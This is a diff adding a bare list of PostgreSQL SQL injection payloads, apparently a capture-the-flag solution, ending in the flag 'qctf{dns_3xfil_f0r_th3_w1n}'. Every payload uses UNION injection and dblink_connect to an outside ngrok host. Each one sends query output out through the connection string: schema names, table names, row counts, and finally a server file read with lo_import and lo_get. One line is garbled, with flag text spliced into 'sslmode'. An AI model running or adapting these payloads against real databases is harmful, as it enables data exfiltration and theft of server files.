@@ -1,0 +1,10 @@
+asd' UNION SELECT 1,(SELECT dblink_connect('host=2.tcp.ngrok.io port=15388 user=navy password=Test1234! dbname=navy sslmode=disable')) --
+asd' UNION SELECT 1,(SELECT dblink_connect('host=2.tcp.ngrok.io port=15388  sslmode=disable user=' || (SELECT string_agg(schema_name,':') FROM information_schema.schemata) || ' password=Test1234! dbname=navy')) --
+asd' UNION SELECT 1,(SELECT dblink_connect('host=2.tcp.ngrok.io port=15388 sslmode=disable user=' || (SELECT string_agg(tablename, ':') FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || ' password=Test1234! dbname=navy')) --
+asd' UNION SELECT 1,(SELECT dblink_connect('host=2.tcp.ngrok.io port=15388 sslmode=disable user=' || (SELECT COUNT(*) FROM searches) || ' password=Test1234! dbname=navy')) --
+asd' UNION SELECT 1,(SELECT dblink_connect('host=2.tcp.ngrok.io port=15388 sslmode=di_3xfil_f0r_th3_wsable user=' || (SELECT lo_import('/var/lib/postgresql/data/secret')) || ' password=Test1234! dbname=navy')) --
+oid=20359
+asd' UNION SELECT 1,(SELECT dblink_connect('host=2.tcp.ngrok.io port=15388 sslmode=disable user=' || (SELECT string_agg(cast(l.oid as text), ':') FROM pg_largeobject_metadata l) || ' password=Test1234! dbname=navy')) --
+asd' UNION SELECT 1,(SELECT dblink_connect('host=2.tcp.ngrok.io port=15388 sslmode=disable user=' || (SELECT convert_from(lo_get(16444), 'UTF8')) || ' password=Test1234! dbname=navy')) --
+
+qctf{dns_3xfil_f0r_th3_w1n}
